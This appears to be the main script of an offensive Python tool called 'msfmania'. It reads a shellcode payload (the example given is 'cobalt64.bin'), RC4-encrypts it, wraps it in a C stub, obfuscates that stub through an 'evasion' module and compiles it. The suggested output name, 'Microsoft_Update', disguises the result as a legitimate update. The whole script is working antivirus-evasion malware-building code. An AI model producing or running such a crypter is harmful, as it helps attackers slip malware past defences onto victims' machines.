from msfmania import compiler, core, encryption, evasion, builder
import argparse

payload = ""
filename = ""

if __name__ == '__main__':
    core.banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", help="Select the payload file to use (ex: cobalt64.bin)", required=True)
    parser.add_argument("-o", "--filename", help="Choose the name of the output file (ex: Microsoft_Update)", required=True)
    parser.add_argument("-k", "--keysize", help="RC4 key size in bytes (1-3)", type=int, choices=[1, 2, 3], default=1)

    args = parser.parse_args()

    payload += str(args.payload)
    filename += str(args.filename)

    payload = open(payload, "rb").read()
    encrypted_shellcode, payload_hash, salt = encryption.shellcode_encryption(payload, args.keysize)
    
    builder.create_stub(encrypted_shellcode, payload_hash, salt, args.keysize)
    evasion.obfuscate_c_file("/tmp/main.c")
    compiler.compile(filename)
    